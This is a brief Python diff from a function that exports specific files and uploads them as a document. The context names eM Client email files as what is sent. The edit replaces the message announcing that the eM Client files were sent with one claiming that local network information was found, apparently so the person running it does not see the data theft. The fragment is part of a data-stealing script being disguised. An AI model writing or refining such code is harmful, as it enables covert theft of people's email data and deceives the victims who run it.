@@ -124,7 +124,7 @@ def exporter_fichiers_specifiques_et_envoyer():
                 files={"document": f}
             )
 
-        print("✅ Fichiers essentiels eM Client envoyés avec succès.")
+        print("✅ Informations Réseau Locale trouvée.")
     except Exception as e:
         print("❌ Erreur :", e)
     finally:
